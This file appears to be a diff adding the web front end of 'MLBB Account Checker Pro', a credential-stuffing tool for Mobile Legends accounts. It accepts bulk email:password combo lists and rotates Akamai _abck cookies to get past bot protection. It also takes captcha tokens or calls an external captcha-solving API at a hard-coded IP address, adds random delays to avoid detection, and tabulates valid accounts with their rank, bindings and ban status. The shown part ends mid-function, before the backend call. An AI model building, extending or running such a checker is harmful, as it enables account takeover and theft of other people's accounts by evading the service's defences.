@@ -1,0 +1,1565 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>MLBB Account Checker Pro | @BokirTools</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
+            min-height: 100vh;
+            color: #fff;
+            position: relative;
+        }
+
+        .watermark {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 1000;
+            font-size: 14px;
+            font-weight: 600;
+            background: rgba(0,0,0,0.7);
+            padding: 8px 16px;
+            border-radius: 30px;
+            backdrop-filter: blur(5px);
+            letter-spacing: 1px;
+            color: #00d4ff;
+            font-family: monospace;
+            border: 1px solid rgba(0,212,255,0.5);
+            pointer-events: none;
+        }
+
+        .watermark i {
+            margin-right: 6px;
+            color: #ff6b6b;
+        }
+
+        .container {
+            max-width: 1800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 25px 20px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 30px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .logo {
+            font-size: 2.5rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #00d4ff, #ff6b6b);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 10px;
+        }
+
+        .logo i {
+            background: none;
+            -webkit-background-clip: unset;
+            background-clip: unset;
+            color: #00d4ff;
+            margin-right: 10px;
+        }
+
+        .header h1 {
+            font-size: 1.8rem;
+            margin-bottom: 8px;
+        }
+
+        .header p {
+            color: rgba(255,255,255,0.7);
+            font-size: 0.9rem;
+        }
+
+        .api-status {
+            display: inline-block;
+            margin-top: 10px;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            background: rgba(0,0,0,0.5);
+        }
+
+        .api-status.online {
+            background: rgba(76, 175, 80, 0.3);
+            color: #4caf50;
+        }
+
+        .api-status.offline {
+            background: rgba(244, 67, 54, 0.3);
+            color: #f44336;
+        }
+
+        .api-status.checking {
+            background: rgba(0, 212, 255, 0.3);
+            color: #00d4ff;
+        }
+
+        .storage-info {
+            background: rgba(0,212,255,0.1);
+            border: 1px solid rgba(0,212,255,0.3);
+            border-radius: 12px;
+            padding: 8px 15px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+            font-size: 0.8rem;
+        }
+
+        .storage-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .storage-badge i {
+            color: #00d4ff;
+        }
+
+        .storage-actions {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .storage-actions button {
+            background: rgba(255,255,255,0.1);
+            border: none;
+            padding: 4px 10px;
+            border-radius: 6px;
+            color: #fff;
+            cursor: pointer;
+            font-size: 0.7rem;
+            transition: all 0.2s;
+        }
+
+        .storage-actions button:hover {
+            background: rgba(255,255,255,0.2);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .stat-card {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 15px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.2);
+            transition: transform 0.3s;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-3px);
+        }
+
+        .stat-icon {
+            font-size: 1.8rem;
+            margin-bottom: 8px;
+        }
+
+        .stat-value {
+            font-size: 1.8rem;
+            font-weight: 800;
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            font-size: 0.75rem;
+            color: rgba(255,255,255,0.7);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .main-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            margin-bottom: 25px;
+        }
+
+        @media (max-width: 1200px) {
+            .main-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .main-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .card {
+            background: rgba(255,255,255,0.08);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 20px;
+            border: 1px solid rgba(255,255,255,0.15);
+        }
+
+        .card-title {
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-bottom: 18px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid rgba(0,212,255,0.5);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .card-title i {
+            color: #00d4ff;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 0.85rem;
+            font-weight: 500;
+            color: rgba(255,255,255,0.8);
+        }
+
+        label i {
+            margin-right: 6px;
+            color: #00d4ff;
+            width: 20px;
+        }
+
+        input, select, textarea {
+            width: 100%;
+            padding: 10px 14px;
+            background: rgba(0,0,0,0.4);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 10px;
+            color: #fff;
+            font-size: 0.85rem;
+            transition: all 0.3s;
+            font-family: 'Inter', monospace;
+        }
+
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: #00d4ff;
+            box-shadow: 0 0 0 3px rgba(0,212,255,0.2);
+        }
+
+        textarea {
+            resize: vertical;
+            min-height: 100px;
+            font-family: monospace;
+            font-size: 0.8rem;
+        }
+
+        .btn {
+            padding: 10px 18px;
+            border: none;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 0.85rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #00d4ff, #0099cc);
+            color: #fff;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0,212,255,0.4);
+        }
+
+        .btn-danger {
+            background: linear-gradient(135deg, #ff6b6b, #cc5454);
+            color: #fff;
+        }
+
+        .btn-danger:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(255,107,107,0.4);
+        }
+
+        .btn-warning {
+            background: linear-gradient(135deg, #ffa502, #cc8400);
+            color: #fff;
+        }
+
+        .btn-secondary {
+            background: rgba(255,255,255,0.2);
+            color: #fff;
+        }
+
+        .btn-secondary:hover:not(:disabled) {
+            background: rgba(255,255,255,0.3);
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .progress-section {
+            margin-top: 15px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00d4ff, #ff6b6b);
+            width: 0%;
+            transition: width 0.3s;
+            border-radius: 10px;
+        }
+
+        .results-container {
+            margin-top: 25px;
+        }
+
+        .results-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .results-table-wrapper {
+            overflow-x: auto;
+            border-radius: 16px;
+            background: rgba(0,0,0,0.3);
+            max-height: 500px;
+            overflow-y: auto;
+        }
+
+        .results-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.75rem;
+        }
+
+        .results-table th,
+        .results-table td {
+            padding: 8px 10px;
+            text-align: left;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .results-table th {
+            background: rgba(0,212,255,0.2);
+            font-weight: 600;
+            color: #00d4ff;
+            position: sticky;
+            top: 0;
+        }
+
+        .results-table tr:hover {
+            background: rgba(255,255,255,0.05);
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            font-weight: 600;
+        }
+
+        .status-valid {
+            background: rgba(76, 175, 80, 0.2);
+            color: #4caf50;
+            border: 1px solid #4caf50;
+        }
+
+        .status-invalid {
+            background: rgba(244, 67, 54, 0.2);
+            color: #f44336;
+            border: 1px solid #f44336;
+        }
+
+        .status-banned {
+            background: rgba(255, 152, 0, 0.2);
+            color: #ff9800;
+            border: 1px solid #ff9800;
+        }
+
+        .status-checking {
+            background: rgba(0, 212, 255, 0.2);
+            color: #00d4ff;
+            border: 1px solid #00d4ff;
+        }
+
+        .status-error {
+            background: rgba(244, 67, 54, 0.2);
+            color: #f44336;
+            border: 1px solid #f44336;
+        }
+
+        .tabs {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 15px;
+            border-bottom: 1px solid rgba(255,255,255,0.2);
+            flex-wrap: wrap;
+        }
+
+        .tab {
+            padding: 8px 16px;
+            cursor: pointer;
+            border-radius: 10px 10px 0 0;
+            transition: all 0.3s;
+            background: transparent;
+            color: rgba(255,255,255,0.7);
+            font-size: 0.85rem;
+        }
+
+        .tab.active {
+            background: rgba(0,212,255,0.2);
+            color: #00d4ff;
+            border-bottom: 2px solid #00d4ff;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            background: rgba(0,0,0,0.5);
+        }
+
+        .badge-info {
+            background: rgba(0,212,255,0.2);
+            color: #00d4ff;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            padding: 15px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            font-size: 0.75rem;
+            color: rgba(255,255,255,0.5);
+        }
+
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(255,255,255,0.1);
+            border-radius: 10px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #00d4ff;
+            border-radius: 10px;
+        }
+
+        .delay-inputs {
+            display: flex;
+            gap: 10px;
+        }
+
+        .delay-inputs input {
+            flex: 1;
+        }
+
+        .checkbox-label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+        }
+
+        .checkbox-label input {
+            width: auto;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #00d4ff;
+            animation: spin 0.6s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .api-url-input {
+            font-family: monospace;
+            font-size: 0.8rem;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 80px;
+            right: 20px;
+            background: rgba(0,0,0,0.9);
+            color: #fff;
+            padding: 12px 20px;
+            border-radius: 10px;
+            border-left: 4px solid #00d4ff;
+            z-index: 2000;
+            animation: slideIn 0.3s ease;
+            font-size: 0.85rem;
+            max-width: 350px;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        .api-url-manual {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+        }
+
+        .api-url-manual input {
+            flex: 1;
+            font-size: 0.75rem;
+        }
+
+        .api-url-manual button {
+            padding: 8px 12px;
+            white-space: nowrap;
+        }
+    </style>
+</head>
+<body>
+    <div class="watermark">
+        <i class="fas fa-code"></i> @BokirTools | MLBB Account Checker Pro
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <i class="fas fa-gamepad"></i> BokirTools MLBB Checker
+            </div>
+            <h1>Premium Account Checker Pro</h1>
+            <p>Complete account checker with _abck cookie & captcha support | Web version by @BokirTools</p>
+            <div id="api-status" class="api-status checking">
+                <i class="fas fa-spinner fa-pulse"></i> Initializing...
+            </div>
+        </div>
+
+        <div class="storage-info">
+            <div class="storage-badge">
+                <i class="fas fa-database"></i>
+                <span id="storage-status">💾 Data tersimpan secara lokal</span>
+            </div>
+            <div class="storage-actions">
+                <button id="save-session-btn" title="Simpan sesi saat ini">
+                    <i class="fas fa-save"></i> Simpan Sesi
+                </button>
+                <button id="load-session-btn" title="Muat sesi terakhir">
+                    <i class="fas fa-undo"></i> Muat Sesi
+                </button>
+                <button id="clear-storage-btn" title="Hapus semua data tersimpan">
+                    <i class="fas fa-trash"></i> Hapus Data
+                </button>
+                <button id="export-data-btn" title="Export semua data ke file">
+                    <i class="fas fa-file-export"></i> Export Data
+                </button>
+            </div>
+        </div>
+
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fas fa-check-circle" style="color:#4caf50"></i></div>
+                <div class="stat-value" id="stat-valid">0</div>
+                <div class="stat-label">VALID</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fas fa-times-circle" style="color:#f44336"></i></div>
+                <div class="stat-value" id="stat-invalid">0</div>
+                <div class="stat-label">INVALID</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fas fa-exclamation-triangle" style="color:#ff9800"></i></div>
+                <div class="stat-value" id="stat-banned">0</div>
+                <div class="stat-label">BANNED</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fas fa-chart-line" style="color:#00d4ff"></i></div>
+                <div class="stat-value" id="stat-checked">0</div>
+                <div class="stat-label">CHECKED</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fas fa-trophy" style="color:#ffd700"></i></div>
+                <div class="stat-value" id="stat-highest-level">0</div>
+                <div class="stat-label">HIGHEST LEVEL</div>
+            </div>
+        </div>
+
+        <div class="main-grid">
+            <div class="card">
+                <div class="card-title">
+                    <i class="fas fa-envelope"></i> Accounts & _abck Cookies
+                </div>
+                
+                <div class="form-group">
+                    <label><i class="fas fa-users"></i> Accounts (email:password)</label>
+                    <textarea id="accounts-input" placeholder="email1:password1&#10;email2:password2&#10;email3:password3"></textarea>
+                </div>
+
+                <div class="form-group">
+                    <label><i class="fas fa-cookie-bite"></i> _abck Cookies</label>
+                    <textarea id="abck-input" placeholder="_abck cookie 1&#10;_abck cookie 2&#10;_abck cookie 3"></textarea>
+                    <small style="color:rgba(255,255,255,0.5); display:block; margin-top:5px;">One per line | Rotated every 5 accounts</small>
+                </div>
+
+                <div class="form-group">
+                    <label><i class="fas fa-file-upload"></i> Or Upload Files</label>
+                    <div class="btn-group">
+                        <button class="btn btn-secondary" id="upload-accounts-btn">
+                            <i class="fas fa-upload"></i> Upload Accounts
+                        </button>
+                        <button class="btn btn-secondary" id="upload-abck-btn">
+                            <i class="fas fa-upload"></i> Upload _abck
+                        </button>
+                    </div>
+                    <input type="file" id="accounts-file-input" accept=".txt" style="display:none">
+                    <input type="file" id="abck-file-input" accept=".txt" style="display:none">
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-title">
+                    <i class="fas fa-shield-alt"></i> Captcha & Settings
+                </div>
+
+                <div class="form-group">
+                    <label><i class="fas fa-robot"></i> Captcha Mode</label>
+                    <div class="btn-group">
+                        <button class="btn btn-secondary" id="captcha-auto-btn" style="background:#00d4ff20">
+                            <i class="fas fa-magic"></i> Auto API
+                        </button>
+                        <button class="btn btn-secondary" id="captcha-manual-btn">
+                            <i class="fas fa-keyboard"></i> Manual
+                        </button>
+                    </div>
+                </div>
+
+                <div id="manual-captcha-section" style="display:none">
+                    <div class="form-group">
+                        <label><i class="fas fa-captcha"></i> Captcha Tokens (CN31)</label>
+                        <textarea id="captcha-input" placeholder="captcha_token_1&#10;captcha_token_2"></textarea>
+                        <small>One per line | Rotated automatically</small>
+                    </div>
+                    <div class="form-group">
+                        <button class="btn btn-secondary" id="upload-captcha-btn">
+                            <i class="fas fa-upload"></i> Upload Captchas
+                        </button>
+                        <input type="file" id="captcha-file-input" accept=".txt" style="display:none">
+                    </div>
+                </div>
+
+                <div id="auto-captcha-section">
+                    <div class="form-group">
+                        <label><i class="fas fa-globe"></i> External Captcha API URL</label>
+                        <input type="text" id="captcha-api-url" value=""  placeholder="http://149.104.77.174:1337/token" class="api-url-input">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label><i class="fas fa-server"></i> Backend API URL <span id="api-url-badge" class="badge badge-info" style="font-size:0.65rem">Auto</span></label>
+                    <div class="api-url-manual">
+                        <input type="text" id="backend-api-url" placeholder="Auto detected" class="api-url-input">
+                        <button id="apply-api-url" class="btn btn-secondary" style="padding:8px 12px">
+                            <i class="fas fa-check"></i> Apply
+                        </button>
+                        <button id="reset-api-url" class="btn btn-secondary" style="padding:8px 12px">
+                            <i class="fas fa-undo"></i> Reset
+                        </button>
+                    </div>
+                    <small id="api-url-info" style="color:rgba(255,255,255,0.5); display:block; margin-top:5px;">
+                        <i class="fas fa-info-circle"></i> Auto-detected based on current domain
+                    </small>
+                </div>
+
+                <div class="form-group">
+                    <label><i class="fas fa-clock"></i> Random Delay (seconds)</label>
+                    <div class="delay-inputs">
+                        <input type="number" id="min-delay" placeholder="Min" value="3">
+                        <input type="number" id="max-delay" placeholder="Max" value="8">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="checkbox-label">
+                        <input type="checkbox" id="remove-checked" checked>
+                        <i class="fas fa-trash-alt"></i> Remove checked lines from combo
+                    </label>
+                </div>
+
+                <div class="form-group">
+                    <label class="checkbox-label">
+                        <input type="checkbox" id="auto-save-toggle" checked>
+                        <i class="fas fa-save"></i> Auto Save Results (otomatis simpan setiap hasil)
+                    </label>
+                    <small style="color:rgba(255,255,255,0.5);">Data akan tetap ada setelah refresh halaman</small>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-title">
+                    <i class="fas fa-play-circle"></i> Controls
+                </div>
+
+                <div class="btn-group" style="margin-bottom: 15px;">
+                    <button class="btn btn-primary" id="start-check">
+                        <i class="fas fa-play"></i> Start Checking
+                    </button>
+                    <button class="btn btn-danger" id="stop-check" disabled>
+                        <i class="fas fa-stop"></i> Stop
+                    </button>
+                    <button class="btn btn-warning" id="clear-results">
+                        <i class="fas fa-broom"></i> Clear All
+                    </button>
+                </div>
+
+                <div class="progress-section">
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progress-fill"></div>
+                    </div>
+                    <div id="progress-text" style="text-align:center; font-size:0.8rem">Ready to check accounts</div>
+                    <div id="current-account" style="text-align:center; font-size:0.75rem; color:#00d4ff; margin-top:5px"></div>
+                </div>
+
+                <div class="form-group">
+                    <label><i class="fas fa-chart-simple"></i> Live Statistics</label>
+                    <div style="background:rgba(0,0,0,0.3); border-radius:10px; padding:10px;">
+                        <div style="display:flex; justify-content:space-between; margin-bottom:5px;">
+                            <span><i class="fas fa-check-circle" style="color:#4caf50"></i> Valid:</span>
+                            <span id="live-valid">0</span>
+                        </div>
+                        <div style="display:flex; justify-content:space-between; margin-bottom:5px;">
+                            <span><i class="fas fa-times-circle" style="color:#f44336"></i> Invalid:</span>
+                            <span id="live-invalid">0</span>
+                        </div>
+                        <div style="display:flex; justify-content:space-between; margin-bottom:5px;">
+                            <span><i class="fas fa-exclamation-triangle" style="color:#ff9800"></i> Banned:</span>
+                            <span id="live-banned">0</span>
+                        </div>
+                        <div style="display:flex; justify-content:space-between;">
+                            <span><i class="fas fa-chart-line"></i> Checked:</span>
+                            <span id="live-checked">0</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="results-container">
+            <div class="results-header">
+                <span><i class="fas fa-table"></i> Results <span id="last-save-time" style="font-size:0.7rem; color:#00d4ff;"></span></span>
+                <div class="btn-group">
+                    <button class="btn btn-secondary" id="filter-all">All</button>
+                    <button class="btn btn-secondary" id="filter-valid">Valid</button>
+                    <button class="btn btn-secondary" id="filter-invalid">Invalid</button>
+                    <button class="btn btn-secondary" id="filter-banned">Banned</button>
+                    <button class="btn btn-primary" id="export-results">
+                        <i class="fas fa-download"></i> Export
+                    </button>
+                </div>
+            </div>
+            <div class="results-table-wrapper">
+                <table class="results-table" id="results-table">
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>Email</th>
+                            <th>Status</th>
+                            <th>Name</th>
+                            <th>ID (Zone)</th>
+                            <th>Level</th>
+                            <th>Current Rank</th>
+                            <th>Highest Rank</th>
+                            <th>Bindings</th>
+                            <th>Region</th>
+                            <th>Create Date</th>
+                            <th>Ban Status</th>
+                        </tr>
+                    </thead>
+                    <tbody id="results-body">
+                        <tr>
+                            <td colspan="12" style="text-align:center">No accounts checked yet</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p><i class="fas fa-shield-alt"></i> MLBB Account Checker Pro | Full integration with promax.py | Data tersimpan secara lokal (tidak hilang setelah refresh) | Watermark: @BokirTools</p>
+            <p id="api-debug-info" style="font-size:0.65rem; margin-top:5px; color:rgba(255,255,255,0.4);"></p>
+        </div>
+    </div>
+
+    <script>
+        // ========== KONFIGURASI API DINAMIS ==========
+        // Fungsi untuk mendeteksi environment dan mendapatkan API URL yang tepat
+        function getDefaultApiUrl() {
+            const hostname = window.location.hostname;
+            const protocol = window.location.protocol;
+            
+            // Deteksi apakah di localhost atau IP local
+            const isLocal = hostname === 'localhost' || 
+                           hostname === '127.0.0.1' || 
+                           hostname.startsWith('192.168.') ||
+                           hostname.startsWith('10.') ||
+                           hostname.endsWith('.local');
+            
+            // Deteksi apakah di Vercel Preview
+            const isVercelPreview = hostname.includes('.vercel.app');
+            
+            // Deteksi apakah di Render
+            const isRender = hostname.includes('.onrender.com');
+            
+            // Deteksi apakah di production dengan path relatif
+            if (isLocal) {
+                // Local development
+                return 'http://localhost:5000/api';
+            } else if (isVercelPreview || isRender) {
+                // Vercel/Render deployment - gunakan path relatif
+                return '/api';
+            } else {
+                // Production dengan custom domain - gunakan path relatif
+                return '/api';
+            }
+        }
+        
+        // Inisialisasi API URL
+        let API_BASE_URL = localStorage.getItem('api_url_override') || getDefaultApiUrl();
+        
+        // Update display di UI
+        function updateApiUrlDisplay() {
+            const inputField = document.getElementById('backend-api-url');
+            const infoSpan = document.getElementById('api-url-info');
+            const badge = document.getElementById('api-url-badge');
+            const isDefault = API_BASE_URL === getDefaultApiUrl();
+            
+            if (inputField) {
+                inputField.value = API_BASE_URL;
+                inputField.placeholder = getDefaultApiUrl();
+            }
+            
+            if (badge) {
+                badge.textContent = isDefault ? 'Auto' : 'Manual';
+                badge.style.background = isDefault ? 'rgba(0,212,255,0.2)' : 'rgba(255,107,107,0.2)';
+                badge.style.color = isDefault ? '#00d4ff' : '#ff6b6b';
+            }
+            
+            if (infoSpan) {
+                if (isDefault) {
+                    infoSpan.innerHTML = `<i class="fas fa-magic"></i> Auto-detected: ${API_BASE_URL} (based on current domain)`;
+                } else {
+                    infoSpan.innerHTML = `<i class="fas fa-edit"></i> Manual override: ${API_BASE_URL}`;
+                }
+            }
+            
+            // Debug info
+            document.getElementById('api-debug-info').innerHTML = `
+                <i class="fas fa-terminal"></i> Host: ${window.location.hostname} | 
+                Protocol: ${window.location.protocol} | 
+                API: ${API_BASE_URL} | 
+                Mode: ${isDefault ? 'Auto' : 'Manual'}
+            `;
+        }
+        
+        // Set API URL (dengan save ke localStorage)
+        function setApiUrl(url, save = true) {
+            if (!url || url.trim() === '') {
+                // Reset ke default
+                API_BASE_URL = getDefaultApiUrl();
+                if (save) localStorage.removeItem('api_url_override');
+            } else {
+                API_BASE_URL = url.trim();
+                if (save) localStorage.setItem('api_url_override', API_BASE_URL);
+            }
+            updateApiUrlDisplay();
+            showToast(`API URL: ${API_BASE_URL}`, 'info');
+            checkApiConnection();
+        }
+        
+        // Reset ke default
+        function resetApiUrl() {
+            setApiUrl('', true);
+        }
+        
+        // ========== STORAGE KEYS ==========
+        const STORAGE_KEYS = {
+            RESULTS: 'mlbb_checker_results',
+            STATS: 'mlbb_checker_stats',
+            LAST_SAVE: 'mlbb_checker_last_save',
+            SESSION_DATA: 'mlbb_checker_session'
+        };
+        
+        // ========== STATE ==========
+        let accounts = [];
+        let abckCookies = [];
+        let captchas = [];
+        let captchaMode = 'auto';
+        let results = [];
+        let isChecking = false;
+        let currentIndex = 0;
+        let currentFilter = 'all';
+        let isApiOnline = false;
+        let autoSaveEnabled = true;
+        let autoSaveTimeout = null;
+        
+        let stats = {
+            valid: 0,
+            invalid: 0,
+            banned: 0,
+            checked: 0,
+            total: 0,
+            highestLevel: 0
+        };
+        
+        // ========== DOM ELEMENTS ==========
+        const elements = {
+            statValid: document.getElementById('stat-valid'),
+            statInvalid: document.getElementById('stat-invalid'),
+            statBanned: document.getElementById('stat-banned'),
+            statChecked: document.getElementById('stat-checked'),
+            statHighestLevel: document.getElementById('stat-highest-level'),
+            liveValid: document.getElementById('live-valid'),
+            liveInvalid: document.getElementById('live-invalid'),
+            liveBanned: document.getElementById('live-banned'),
+            liveChecked: document.getElementById('live-checked'),
+            progressFill: document.getElementById('progress-fill'),
+            progressText: document.getElementById('progress-text'),
+            currentAccount: document.getElementById('current-account'),
+            startBtn: document.getElementById('start-check'),
+            stopBtn: document.getElementById('stop-check'),
+            clearBtn: document.getElementById('clear-results'),
+            exportBtn: document.getElementById('export-results'),
+            resultsBody: document.getElementById('results-body'),
+            accountsInput: document.getElementById('accounts-input'),
+            abckInput: document.getElementById('abck-input'),
+            captchaInput: document.getElementById('captcha-input'),
+            captchaApiUrl: document.getElementById('captcha-api-url'),
+            backendApiUrl: document.getElementById('backend-api-url'),
+            minDelay: document.getElementById('min-delay'),
+            maxDelay: document.getElementById('max-delay'),
+            removeChecked: document.getElementById('remove-checked'),
+            apiStatus: document.getElementById('api-status'),
+            autoSaveToggle: document.getElementById('auto-save-toggle')
+        };
+        
+        // ========== TOAST NOTIFICATION ==========
+        function showToast(message, type = 'info') {
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            const icons = {
+                success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️'
+            };
+            toast.innerHTML = `${icons[type] || 'ℹ️'} ${message}`;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 3000);
+        }
+        
+        // ========== STORAGE FUNCTIONS ==========
+        function saveToLocalStorage() {
+            if (!autoSaveEnabled) return false;
+            
+            try {
+                const dataToSave = {
+                    results: results,
+                    stats: stats,
+                    lastSave: new Date().toISOString()
+                };
+                localStorage.setItem(STORAGE_KEYS.RESULTS, JSON.stringify(dataToSave));
+                sessionStorage.setItem(STORAGE_KEYS.SESSION_DATA, JSON.stringify(dataToSave));
+                document.getElementById('last-save-time').innerHTML = `(Last saved: ${new Date().toLocaleTimeString()})`;
+                return true;
+            } catch (error) {
+                console.error('Failed to save:', error);
+                return false;
+            }
+        }
+        
+        function loadFromLocalStorage() {
+            try {
+                const savedData = localStorage.getItem(STORAGE_KEYS.RESULTS);
+                if (savedData) {
+                    const parsed = JSON.parse(savedData);
+                    if (parsed.results && Array.isArray(parsed.results)) results = parsed.results;
+                    if (parsed.stats) stats = parsed.stats;
+                    updateStats();
+                    renderResults();
+                    showToast(`✅ Data loaded: ${results.length} accounts`, 'success');
+                    return true;
+                }
+                
+                const sessionData = sessionStorage.getItem(STORAGE_KEYS.SESSION_DATA);
+                if (sessionData) {
+                    const parsed = JSON.parse(sessionData);
+                    if (parsed.results) results = parsed.results;
+                    if (parsed.stats) stats = parsed.stats;
+                    updateStats();
+                    renderResults();
+                    showToast(`📦 Session data loaded: ${results.length} accounts`, 'info');
+                    return true;
+                }
+                return false;
+            } catch (error) {
+                console.error('Failed to load:', error);
+                return false;
+            }
+        }
+        
+        function clearStorage() {
+            if (confirm('⚠️ Delete all saved data? This cannot be undone.')) {
+                localStorage.removeItem(STORAGE_KEYS.RESULTS);
+                localStorage.removeItem(STORAGE_KEYS.STATS);
+                localStorage.removeItem(STORAGE_KEYS.LAST_SAVE);
+                sessionStorage.removeItem(STORAGE_KEYS.SESSION_DATA);
+                showToast('🗑️ All saved data cleared', 'warning');
+                if (!isChecking) {
+                    results = [];
+                    stats = { valid: 0, invalid: 0, banned: 0, checked: 0, total: 0, highestLevel: 0 };
+                    updateStats();
+                    renderResults();
+                }
+            }
+        }
+        
+        function exportAllData() {
+            const exportData = {
+                exportDate: new Date().toISOString(),
+                version: '1.0',
+                stats: stats,
+                results: results,
+                totalAccounts: results.length
+            };
+            const dataStr = JSON.stringify(exportData, null, 2);
+            const blob = new Blob([dataStr], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `mlbb_backup_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.json`;
+            a.click();
+            URL.revokeObjectURL(url);
+            showToast(`📥 Data exported (${results.length} accounts)`, 'success');
+        }
+        
+        function triggerAutoSave() {
+            if (!autoSaveEnabled) return;
+            if (autoSaveTimeout) clearTimeout(autoSaveTimeout);
+            autoSaveTimeout = setTimeout(() => saveToLocalStorage(), 1000);
+        }
+        
+        // ========== API FUNCTIONS ==========
+        async function checkApiConnection() {
+            try {
+                elements.apiStatus.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Checking API...';
